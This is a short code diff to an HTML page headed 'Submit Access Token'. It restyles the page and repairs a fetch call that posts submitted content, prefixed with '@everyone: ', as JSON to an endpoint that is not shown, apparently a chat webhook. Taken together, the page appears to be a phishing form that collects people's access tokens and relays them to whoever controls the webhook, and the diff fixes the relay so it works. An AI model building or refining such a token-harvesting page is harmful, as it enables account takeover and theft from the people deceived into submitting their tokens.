@@ -14,6 +14,8 @@ justify-content:center;
 align-items:center;
 font-family:Arial;
 background:linear-gradient(black,#1a1a1a,#ffffff);
+position:relative;
+overflow:hidden;
 }
 
 /* Glow background effect */
@@ -43,15 +45,6 @@ padding:40px;
 border-radius:15px;
 text-align:center;
 box-shadow:0 0 40px rgba(255,255,255,0.3);
-}
-
-/* Images */
-
-.images img{
-width:120px;
-border-radius:10px;
-margin:5px;
-box-shadow:0 0 20px rgba(255,255,255,0.6);
 }
 
 /* Title */
@@ -95,6 +88,9 @@ box-shadow:0 0 20px white,0 0 50px white;
 </style>
 </head>
 
+<body>
+
+<div class="container">
 
 <h1>Submit Access Token</h1>
 
@@ -120,7 +116,7 @@ headers:{
 "Content-Type":"application/json"
 },
 body:JSON.stringify({
-content:**"@everyone: "+message**
+content:"@everyone: " + message
 })
 });
 
